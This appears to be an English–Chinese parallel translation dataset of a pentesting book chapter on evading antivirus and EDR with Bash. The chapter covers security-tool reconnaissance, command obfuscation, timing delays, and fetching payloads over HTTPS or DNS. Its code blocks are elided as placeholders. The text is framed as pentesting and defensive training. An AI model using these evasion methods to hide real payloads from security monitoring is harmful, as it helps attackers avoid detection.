- en: '14'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '14'
- en: Evasion and Obfuscation
  id: totrans-1
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 规避与混淆
- en: In cybersecurity, mastering **evasion** and **obfuscation** techniques is critical
    for both offense and defense. With the rise of **antivirus** ( **AV** ) and **Endpoint
    Detection and Response** ( **EDR** ) systems, pentesters must now learn evasion
    skills traditionally used by red teams. Without these skills, your efforts to
    identify vulnerabilities and create exploit proofs of concept could be blocked,
    possibly leading to false negatives regarding system vulnerabilities.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 在网络安全领域，掌握**规避**和**混淆**技术对于攻防双方都至关重要。随着**杀毒软件**（**AV**）和**终端检测与响应**（**EDR**）系统的兴起，渗透测试人员现在必须学习传统上由红队使用的规避技能。没有这些技能，您在识别漏洞和创建利用证明概念时的努力可能会受到阻碍，从而导致系统漏洞的误报。
- en: This chapter focuses on using the Bash shell to implement these techniques,
    specifically in the context of evading detection by AV and EDR systems during
    pentesting activities. AV and EDR were formerly only found in Windows environments.
    Today, they are frequently deployed to Linux/Unix systems.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 本章专注于使用 Bash shell 实现这些技术，特别是在渗透测试活动中规避 AV 和 EDR 系统检测的背景下。AV 和 EDR 以前仅出现在 Windows
    环境中，现在它们已经广泛部署到 Linux/Unix 系统中。
- en: Throughout this chapter, we will explore various methods of creating and executing
    Bash scripts that minimize the risk of detection. We’ll begin by examining how
    to enumerate the environment for AV and EDR presence, then progress through basic
    and advanced obfuscation techniques. Finally, we’ll look at automating the generation
    of evasion scripts.
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将探索各种创建和执行 Bash 脚本的方法，以减少被检测的风险。我们将首先研究如何枚举环境中的 AV 和 EDR 的存在，然后深入探讨基本和高级的混淆技术。最后，我们将学习如何自动化生成规避脚本。
- en: By the end of this chapter, you will have a solid understanding of how AV and
    EDR systems function, common detection mechanisms, and practical skills in employing
    obfuscation and evasion tactics using Bash. These skills are valuable not only
    for pentesters but also for security professionals seeking to enhance their defensive
    capabilities by understanding the techniques used by potential attackers.
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 到本章结束时，您将对 AV 和 EDR 系统的工作原理、常见的检测机制以及使用 Bash 实现混淆和规避策略的实用技巧有一个扎实的理解。这些技能不仅对渗透测试人员非常有价值，对于安全专业人员而言，也能够通过了解潜在攻击者使用的技术，提升自身的防御能力。
- en: 'In this chapter, we’re going to cover the following main topi cs:'
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将涵盖以下主要主题：
- en: Enumerating the environment for AV and EDR
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 枚举环境中的 AV 和 EDR
- en: Basic obfuscation techniques in Bash
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Bash 中的基本混淆技术
- en: Advanced evasion tactics using Bash
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用 Bash 实现高级规避策略
- en: Automating evasion script generation in Bash
  id: totrans-10
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在 Bash 中自动化规避脚本生成
- en: Technical requirements
  id: totrans-11
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 技术要求
- en: 'To complete this chapter, we need access to a Linux environment with a Bash
    shell to execute the examples. Additionally, prerequisite Bash utilities can be
    installed by executing the following command:'
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 要完成本章内容，我们需要一个带有 Bash shell 的 Linux 环境来执行示例代码。此外，您可以通过执行以下命令安装必要的 Bash 工具：
- en: '[PRE0]'
  id: totrans-13
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: The code for this chapter can be found at [https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter14](https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter14)
    .
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 本章的代码可以在 [https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter14](https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter14)
    找到。
- en: With the prerequisites out of the way, let’s dive in!
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 在完成前置要求后，让我们开始吧！
- en: Enumerating the environment for AV and EDR
  id: totrans-16
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 枚举环境中的 AV 和 EDR
- en: Before attempting any evasion techniques, it’s essential to understand the security
    landscape of the target system. This section focuses on identifying and analyzing
    the presence of AV and EDR solutions using Bash scripting. We’ll explore practical
    methods of gathering information about installed security software, active monitoring
    processes, and system configurations that may impact our pentesting activities.
    By using Bash commands and scripts, we’ll develop a systematic approach to reconnaissance.
    This will enable more effective and targeted evasion strategies in subsequent
    phases of our assessment.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 在尝试任何规避技术之前，了解目标系统的安全环境至关重要。本节将重点介绍使用 Bash 脚本识别和分析 AV 和 EDR 解决方案的存在。我们将探索收集有关已安装的安全软件、活动监控进程和可能影响我们渗透测试活动的系统配置的实用方法。通过使用
    Bash 命令和脚本，我们将开发出一种系统化的侦察方法。这将使我们在后续评估阶段能够采取更有效、更有针对性的规避策略。
- en: 'Environment reconnaissance is a critical first step in any pentest engagement,
    especially when dealing with systems protected by AV and EDR solutions. This process
    involves gathering detailed information about the target system’s security measures,
    which is essential for several reasons:'
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 环境侦察是任何渗透测试任务中的关键第一步，特别是当涉及到由AV和EDR解决方案保护的系统时。这个过程涉及收集目标系统的安全措施的详细信息，这对于以下几个原因至关重要：
- en: '**Tailored approach** : By understanding the specific AV/EDR solutions in place,
    you can customize your pentest techniques to avoid detection. Each security solution
    has its own strengths and weaknesses, and knowing these allows you to adapt your
    methods accordingly.'
  id: totrans-19
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**量身定制的方法**：通过了解已部署的特定AV/EDR解决方案，你可以定制你的渗透测试技术，避免被检测。每个安全解决方案都有自己的优缺点，了解这些可以帮助你根据情况调整方法。'
- en: '**Risk mitigation** : Reconnaissance helps identify potential risks associated
    with your testing activities. For example, some EDR solutions might trigger alerts
    or even automatic responses to certain actions. Understanding these risks allows
    you to plan your testing more carefully and avoid unintended disruptions.'
  id: totrans-20
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**风险缓解**：侦察有助于识别与你的测试活动相关的潜在风险。例如，一些EDR解决方案可能会对某些操作触发警报或甚至自动响应。了解这些风险可以帮助你更仔细地规划测试，避免意外的干扰。'
- en: '**Efficiency** : Knowing the security landscape helps you focus your efforts
    on techniques that are more likely to succeed. This saves time and resources by
    avoiding methods that are likely to be detected or blocked by the identified security
    solutions.'
  id: totrans-21
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**效率**：了解安全形势有助于你集中精力在更有可能成功的技术上。这通过避免那些可能被已识别的安全解决方案检测或阻止的方法，节省了时间和资源。'
- en: '**Realistic assessment** : Understanding the target environment allows you
    to provide a more accurate assessment of the system’s security posture. This includes
    evaluating how well the existing security solutions are configured and identifying
    any gaps in protection.'
  id: totrans-22
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**现实评估**：了解目标环境可以让你提供更准确的系统安全评估。这包括评估现有安全解决方案的配置情况，并识别任何保护漏洞。'
- en: '**Stealth** : In scenarios where maintaining a low profile is critical, environment
    reconnaissance allows you to design your tests to minimize the risk of detection.
    This is particularly important in red team exercises or when testing production
    systems.'
  id: totrans-23
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**隐匿性**：在需要保持低调的场景下，环境侦察可以帮助你设计测试，以最小化被检测的风险。这在红队演习或测试生产系统时尤为重要。'
- en: 'Let’s first take a look at process enumeration:'
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们首先来看一下进程枚举：
- en: One of the primary methods is examining running processes. This can be done
    using commands such as **ps** , **top** , or **htop** .
  id: totrans-25
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 主要的方法之一是检查正在运行的进程。这可以通过使用像**ps**、**top**或**htop**这样的命令来完成。
- en: 'The following shows how to list all running processes:'
  id: totrans-26
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 以下展示了如何列出所有运行中的进程：
- en: '[PRE1]'
  id: totrans-27
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'This command looks for specific AV/EDR process names:'
  id: totrans-28
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 此命令查找特定的AV/EDR进程名称：
- en: '[PRE2]'
  id: totrans-29
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE2]'
- en: The output will have many false positives due to the short **av** and **edr**
    strings since they may match other unrelated words. Review the output carefully.
  id: totrans-30
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 由于**av**和**edr**字符串较短，输出可能会有许多假阳性，因为它们可能匹配其他无关的词汇。请仔细审查输出。
- en: Filesystem analysis is another important aspect of endpoint protection software
    enumeration, that is, checking for the presence of specific files or directories
    associated with AV/EDR solutions.
  id: totrans-31
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 文件系统分析是端点保护软件枚举的另一个重要方面，即检查与AV/EDR解决方案相关的特定文件或目录是否存在。
- en: 'We can search for common AV/EDR-related directories, as follows:'
  id: totrans-32
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们可以搜索常见的与AV/EDR相关的目录，如下所示：
- en: '[PRE3]'
  id: totrans-33
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'The following command finds files with specific names:'
  id: totrans-34
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 以下命令查找具有特定名称的文件：
- en: '[PRE4]'
  id: totrans-35
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE4]'
- en: You should also be examining network connections to reveal communication with
    AV/EDR management servers.
  id: totrans-36
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 你还应该检查网络连接，以揭示与AV/EDR管理服务器的通信。
- en: 'The following example lists all active network connections:'
  id: totrans-37
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 以下示例列出了所有活动的网络连接：
- en: '[PRE5]'
  id: totrans-38
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'In this example, we check for outbound connections to known AV/EDR servers:'
  id: totrans-39
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在这个例子中，我们检查与已知AV/EDR服务器的出站连接：
- en: '[PRE6]'
  id: totrans-40
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE6]'
- en: And, of course, we can’t forget service enumeration. Many AV/EDR solutions run
    as services.
  id: totrans-41
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 当然，我们不能忘记服务枚举。许多AV/EDR解决方案以服务的形式运行。
- en: 'The following example lists all services:'
  id: totrans-42
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 以下示例列出了所有服务：
- en: '[PRE7]'
  id: totrans-43
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'After listing services, we can check the status of specific services as follows:'
  id: totrans-44
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 列出服务后，我们可以检查特定服务的状态，如下所示：
- en: '[PRE8]'
  id: totrans-45
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE8]'
- en: 'Some AV/EDR solutions use kernel modules. The following command will help you
    to reveal kernel modules potentially used for endpoint protection:'
  id: totrans-46
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一些AV/EDR解决方案使用内核模块。以下命令将帮助你揭示可能用于端点保护的内核模块：
- en: '[PRE9]'
  id: totrans-47
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE9]'
- en: 'We can refine the previous command to check for specific modules:'
  id: totrans-48
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们可以进一步优化上面的命令，以检查特定的模块：
- en: '[PRE10]'
  id: totrans-49
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE10]'
- en: 'Don’t forget about system logs. Examining system logs can reveal AV/EDR activity.
    Check the system logs for AV/EDR-related entries as follows:'
  id: totrans-50
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 不要忽视系统日志。检查系统日志可以揭示AV/EDR活动。请按如下方式检查系统日志中的AV/EDR相关条目：
- en: '[PRE11]'
  id: totrans-51
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE11]'
- en: Package manager metadata is another good source of intel. On systems using package
    managers, you can query for installed security software.
  id: totrans-52
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 包管理器元数据是另一种良好的情报来源。在使用包管理器的系统上，你可以查询已安装的安全软件。
- en: 'The following command works for Debian-based systems:'
  id: totrans-53
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 以下命令适用于基于Debian的系统：
- en: '[PRE12]'
  id: totrans-54
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE12]'
- en: 'The following command works for Red Hat-based systems:'
  id: totrans-55
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 以下命令适用于基于Red Hat的系统：
- en: '[PRE13]'
  id: totrans-56
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE13]'
- en: Just like privilege escalation, always check environment variables. Some AV/EDR
    solutions set environment variables.
  id: totrans-57
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 就像特权提升一样，始终检查环境变量。一些AV/EDR解决方案会设置环境变量。
- en: 'We can list all environment variables as shown:'
  id: totrans-58
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们可以列出所有环境变量，如下所示：
- en: '[PRE14]'
  id: totrans-59
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE14]'
- en: 'We can further refine this to look for specific AV/EDR-related variables:'
  id: totrans-60
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们可以进一步优化这个命令，查找特定的AV/EDR相关变量：
- en: '[PRE15]'
  id: totrans-61
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE15]'
- en: 'When implementing these techniques in Bash scripts, it’s important to combine
    multiple methods for a full approach. Here’s a simple example that combines several
    of these approaches. You can find the following code in this chapter’s GitHub
    repository as **ch14_gather_bas ic_info.sh** :'
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 在Bash脚本中实现这些技术时，重要的是将多种方法结合使用，以实现全面的防护。这里有一个简单的示例，结合了几种方法。你可以在本章的GitHub仓库中找到名为**ch14_gather_basic_info.sh**的代码：
- en: '[PRE16]'
  id: totrans-63
  prefs: []
  type: TYPE_PRE
  zh: '[PRE16]'
- en: 'AV and EDR software send data about the endpoint’s status, performance, and
    activities. This is referred to as **telemetry** . The following script checks
    to see whether the host is sending telemetry to common EDR domains. You can find
    it in this chapter’s GitHub repository as **ch14_telem etry_check.sh** :'
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: AV和EDR软件会发送有关端点状态、性能和活动的数据。这被称为**遥测**。以下脚本检查主机是否将遥测数据发送到常见的EDR域。你可以在本章的GitHub仓库中找到名为**ch14_telemetry_check.sh**的脚本：
- en: '[PRE17]'
  id: totrans-65
  prefs: []
  type: TYPE_PRE
  zh: '[PRE17]'
- en: These techniques should provide you with enough information to determine whether
    a Linux or Unix system has any AV or EDR software installed. We will explore obfuscation
    and evasion techniques in subsequent sections of this chapter.
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 这些技术应该能为你提供足够的信息，以确定Linux或Unix系统是否安装了任何AV或EDR软件。在本章的后续部分，我们将探索混淆和规避技术。
- en: Basic obfuscation techniques in Bash
  id: totrans-67
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Bash中的基本混淆技术
- en: In this section, we’ll explore various obfuscation techniques that can be applied
    to Bash scripts. These methods range from simple variable name alterations to
    more complex command substitution and encoding strategies. By combining these
    techniques, pentesters can create scripts that are more likely to evade detection
    and resist analysis.
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将探索可应用于Bash脚本的各种混淆技术。这些方法从简单的变量名更改到更复杂的命令替代和编码策略不等。通过结合这些技术，渗透测试人员可以创建更有可能逃避检测并抵抗分析的脚本。
- en: Obfuscation in Bash scripting is the practice of making code difficult to understand
    while preserving its functionality. For pentesters, obfuscation serves as a valuable
    technique to evade detection by security systems and complicate reverse engineering
    efforts. This section covers fundamental obfuscation methods that can be applied
    to Bash scripts.
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: Bash脚本中的混淆是指在保持功能的同时使代码难以理解。对于渗透测试人员来说，混淆是一种有价值的技术，能够逃避安全系统的检测，并使逆向工程工作变得更加复杂。本节涵盖了可应用于Bash脚本的基本混淆方法。
- en: Bash script obfuscation involves modifying the script’s appearance and structure
    without altering its behavior. The goal is to create code that functions identically
    to the original but is challenging for humans or automated systems to interpret.
    While obfuscation doesn’t provide foolproof protection, it can significantly increase
    the effort required to analyze and understand the script.
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: Bash脚本混淆涉及修改脚本的外观和结构，而不改变其行为。目标是创建功能与原始脚本相同但难以理解的代码。虽然混淆不能提供万无一失的保护，但它可以显著增加分析和理解脚本所需的努力。
- en: 'Here’s a simple example to illustrate the concept:'
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 下面是一个简单的示例，说明了这一概念：
- en: '[PRE18]'
  id: totrans-72
  prefs: []
  type: TYPE_PRE
  zh: '[PRE18]'
- en: 'This straightforward script could be obfuscated as follows:'
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 这个简单的脚本可能会被混淆，示例如下：
- en: '[PRE19]'
  id: totrans-74
  prefs: []
  type: TYPE_PRE
  zh: '[PRE19]'
- en: The **printf** command uses command substitution with the hexadecimal representation
    of the text **Hello World** .
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: '**printf**命令使用命令替换，并显示**Hello World**的十六进制表示。'
- en: Both scripts produce the same output, but the second one is considerably more
    difficult to read at a glance.
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 两个脚本产生相同的输出，但第二个脚本在第一眼看上去要更难阅读。
- en: 'The next example uses basic variable substitution to run the **sudo -l** command,
    which is detected by the EDR agent:'
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 下一个示例使用基本的变量替换来运行**sudo -l**命令，该命令被EDR代理检测到：
- en: '[PRE20]'
  id: totrans-78
  prefs: []
  type: TYPE_PRE
  zh: '[PRE20]'
- en: 'We can do more advanced command substitution with **prin tf** , as shown here:'
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以使用**prin tf**进行更高级的命令替换，如这里所示：
- en: '[PRE21]'
  id: totrans-80
  prefs: []
  type: TYPE_PRE
  zh: '[PRE21]'
- en: This results in running the same command, as shown in the following figure.
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 这将导致运行相同的命令，如下图所示。
- en: '![Figure 14.1 – The output of running an obfuscated sudo command is shown](image/B22229_14_01.jpg)'
  id: totrans-82
  prefs: []
  type: TYPE_IMG
  zh: '![图14.1 – 运行混淆的sudo命令的输出如图所示](image/B22229_14_01.jpg)'
- en: Figure 14.1 – The output of running an obfuscated sudo command is shown
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 图14.1 – 运行混淆的sudo命令的输出如图所示
- en: 'Base64 encoding can be used to obfuscate commands, as shown:'
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 可以使用Base64编码来混淆命令，如下所示：
- en: '[PRE22]'
  id: totrans-85
  prefs: []
  type: TYPE_PRE
  zh: '[PRE22]'
- en: 'We can also split up parts of commands using environment variables, as shown
    in the following example:'
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还可以使用环境变量将命令的部分内容拆分，如下所示：
- en: '[PRE23]'
  id: totrans-87
  prefs: []
  type: TYPE_PRE
  zh: '[PRE23]'
- en: 'Brace expansion is also useful for breaking string detection, as shown here:'
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 大括号扩展在打破字符串检测时也很有用，如这里所示：
- en: '[PRE24]'
  id: totrans-89
  prefs: []
  type: TYPE_PRE
  zh: '[PRE24]'
- en: 'The following example implements command substitution with **cut** :'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 以下示例实现了使用**cut**的命令替换：
- en: '[PRE25]'
  id: totrans-91
  prefs: []
  type: TYPE_PRE
  zh: '[PRE25]'
- en: 'We can also use ASCII decimal values, as shown here:'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还可以使用ASCII十进制值，如这里所示：
- en: '[PRE26]'
  id: totrans-93
  prefs: []
  type: TYPE_PRE
  zh: '[PRE26]'
- en: Each of these methods obfuscates the **sudo -l** command in a different way.
    These techniques can be combined and nested to create more complex obfuscation.
    However, it’s important to note that modern security solutions are often capable
    of detecting these obfuscation attempts. These methods are more effective against
    simple pattern matching, also known as **signature-based** **detection systems**
    .
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 这些方法中的每一种以不同的方式混淆**sudo -l**命令。这些技术可以结合使用或嵌套起来，以创造出更复杂的混淆。然而，重要的是要注意，现代安全解决方案通常能够检测到这些混淆尝试。这些方法在面对简单的模式匹配时更为有效，也被称为**基于签名的**
    **检测系统**。
- en: When testing these obfuscation techniques against EDR systems, observe how each
    method affects detection rates. Some EDR solutions might detect certain obfuscation
    techniques while missing others. This information can be valuable for understanding
    the capabilities and limitations of the EDR system being tested.
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 在针对EDR系统测试这些混淆技术时，请观察每种方法如何影响检测率。一些EDR解决方案可能会检测到某些混淆技术，而忽略其他技术。这些信息对于理解被测试EDR系统的能力和局限性非常有价值。
- en: We’ll try more advanced technique s in the next section.
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将在下一节尝试更高级的技术。
- en: Advanced evasion tactics using Bash
  id: totrans-97
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用Bash的高级规避策略
- en: While basic obfuscation techniques can be effective, more sophisticated evasion
    tactics are often necessary to bypass advanced security measures. This section
    explores advanced evasion methods using Bash.
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然基本的混淆技术可以有效，但为了绕过高级安全措施，通常需要更复杂的规避策略。本节将探讨使用Bash的高级规避方法。
- en: '**Timing-based evasion** involves executing code based on specific time conditions,
    making it harder for security solutions to detect malicious activity. For example,
    I’ve bypassed AV on multiple occasions by encoding or encrypting my payloads in
    the script or executable and inserting code to make it sleep for some time before
    decoding or decrypting and running the payload. AV and EDR vendors do not want
    to upset customers by taking up valuable system resources or making the system
    appear to be slow. Therefore, sometimes simple pauses for a few minutes before
    performing malicious activity are all you need.'
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: '**基于时间的规避**涉及根据特定的时间条件执行代码，使得安全解决方案更难检测到恶意活动。例如，我已经多次通过在脚本或可执行文件中对载荷进行编码或加密，并插入代码让它在解码或解密并运行载荷之前睡眠一段时间，从而绕过AV。AV和EDR供应商不想因为占用宝贵的系统资源或让系统变慢而使客户不满。因此，有时只需要简单的暂停几分钟，再执行恶意活动，就足够了。'
- en: Tip
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 提示
- en: AV and EDR vendors are catching on to the use of simple sleep statements. It’s
    often necessary to use techniques more complex than a call to the **sleep()**
    function, such as performing some random task before checking to see how much
    time has elapsed.
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: AV和EDR供应商已经开始意识到简单的睡眠语句的使用。通常需要使用比调用**sleep()**函数更复杂的技术，例如在检查经过了多少时间之前执行一些随机任务。
- en: 'The following script example avoids using sleep statements by executing benign
    activities and checks to ensure the time is between 1 and 3 A.M. before executing
    the payload. It can be found in this chapter’s GitHub repos itory as **ch14_sleep_1.sh**
    :'
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 以下脚本示例避免使用 sleep 语句，而是通过执行无害活动和检查以确保时间在凌晨 1 点到 3 点之间，才执行有效载荷。它可以在本章的 GitHub
    仓库中找到，文件名为 **ch14_sleep_1.sh**：
- en: '[PRE27]'
  id: totrans-103
  prefs: []
  type: TYPE_PRE
  zh: '[PRE27]'
- en: Alternatively, you can use the **sleep 600** command to sleep for 10 minutes
    before executing the payload. Additionally, you can make detection even more difficult
    by fetching the payload from an HTTPS URL and decoding or decrypting it after
    the sleep statement before execution instead of storing it in the script. Most
    AV systems would initially scan the file and not find any evidence of malicious
    content, then not detect any malicious activity, and eventually stop monitoring
    the file.
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 或者，你可以使用 **sleep 600** 命令在执行有效载荷之前让程序休眠 10 分钟。此外，你还可以通过从 HTTPS URL 获取有效载荷并在
    sleep 语句后解码或解密它，来使检测变得更加困难，而不是将其存储在脚本中。大多数防病毒系统最初会扫描文件并找不到恶意内容的证据，然后不会检测到任何恶意活动，最终停止监控该文件。
- en: In the case of EDR, a simple sleep statement may not be sufficient to evade
    detection if a file, process, or network signature is detected. In cases such
    as this, you may be able to avoid detection by spreading the activity out over
    multiple commands or steps and inserting time between each step. Multiple actions
    occurring in the attack chain within a specific time frame may generate a high
    or critical severity alert. However, if you insert enough time between the actions,
    you may evade detection, or each step may alert at a lower severity and avoid
    scrutiny by the defenders.
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: 在 EDR 环境下，如果检测到文件、进程或网络签名，简单的 sleep 语句可能不足以避开检测。在这种情况下，你可以通过将活动分散到多个命令或步骤中，并在每个步骤之间插入时间，来避免检测。在特定时间范围内发生的多个攻击链动作可能会触发高风险或严重警报。然而，如果在动作之间插入足够的时间，你可能能够避开检测，或者每个步骤可能会以较低的严重性警报，避免被防御者注意。
- en: 'The script has been modified to insert time between each step. The following
    script can be found in this chapter’s GitHub rep ository as **ch14_sleep_2.sh**
    :'
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 脚本已被修改，在每个步骤之间插入了时间。以下脚本可以在本章的 GitHub 仓库中找到，文件名为 **ch14_sleep_2.sh**：
- en: '[PRE28]'
  id: totrans-107
  prefs: []
  type: TYPE_PRE
  zh: '[PRE28]'
- en: If you want to be even more stealthy, you should avoid using **curl** or **wget**
    to fetch payloads and instead use DNS. The following example includes server-
    and client-side code for transferring data over DNS. You would implement the client-side
    code in your Bash script, replacing any use of **curl** or **wget** .
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你想更加隐蔽，应该避免使用 **curl** 或 **wget** 来获取有效载荷，而是使用 DNS。以下示例包含了用于通过 DNS 传输数据的服务器端和客户端代码。你可以在
    Bash 脚本中实现客户端代码，替换任何使用 **curl** 或 **wget** 的地方。
- en: 'The server-side code can be found in this chapter’s GitHub repository as **ch14_dns_server.py**
    . The following client-side code can be found in this chapter’s GitHub repository
    as **ch14_dns_client.sh** :'
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 服务器端代码可以在本章的 GitHub 仓库中找到，文件名为 **ch14_dns_server.py**。客户端代码可以在本章的 GitHub 仓库中找到，文件名为
    **ch14_dns_client.sh**：
- en: '[PRE29]'
  id: totrans-110
  prefs: []
  type: TYPE_PRE
  zh: '[PRE29]'
- en: 'The output of the client can be found in the following figure:'
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端的输出可以在以下图中找到：
- en: '![Figure 14.2 – The output of the DNS client is shown](image/B22229_14_02.jpg)'
  id: totrans-112
  prefs: []
  type: TYPE_IMG
  zh: '![图 14.2 – 显示了 DNS 客户端的输出](image/B22229_14_02.jpg)'
- en: Figure 14.2 – The output of the DNS client is shown
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 图 14.2 – 显示了 DNS 客户端的输出
- en: Important note
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: 重要提示
- en: You will have to edit the server and client yourself to modify it to send payloads
    suitable for pentesting operations. This is simply a framework. You can encode
    or encrypt the data before transferring it, then decode or decrypt it on the client
    side and run the code fully in memory to avoid writing to disk.
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 你需要自己编辑服务器端和客户端代码，修改以发送适合渗透测试操作的有效载荷。这只是一个框架。你可以在传输数据之前对其进行编码或加密，然后在客户端进行解码或解密，并完全在内存中运行代码以避免写入磁盘。
- en: 'The following provides an explanation of the **retrieve_data** function code:'
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是 **retrieve_data** 函数代码的解释：
- en: '**local key="$1"** : This line declares a local variable, **key** , and assigns
    it the value of the first argument passed to the function.'
  id: totrans-117
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**local key="$1"** ：这一行声明了一个本地变量 **key**，并将其赋值为传递给函数的第一个参数的值。'
- en: '**echo "Sending query for: $key.get.$DOMAIN to $SERVER_IP"** : This line prints
    a message indicating what query is being sent.'
  id: totrans-118
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
